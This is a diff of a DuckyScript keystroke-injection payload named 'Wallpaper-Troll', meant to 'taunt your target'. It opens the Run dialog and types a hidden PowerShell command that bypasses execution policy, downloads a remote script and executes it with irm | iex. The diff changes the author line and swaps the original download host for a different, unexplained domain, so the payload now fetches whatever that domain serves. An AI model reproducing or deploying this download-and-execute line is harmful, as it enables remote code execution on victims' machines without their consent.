@@ -1,6 +1,8 @@
 REM     Title: Wallpaper-Troll
 REM
-REM     Author: I am Jakoby
+REM     Who: I'm r03n
+REM
+REM     Author: Jakoby
 REM
 REM     Description: This payload is meant to taunt your target with a revealing wallpaper. See README.md for more details.
 REM
@@ -15,6 +17,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm go.com-online.nl/o06LIE | iex
 DELAY 500
 ENTER
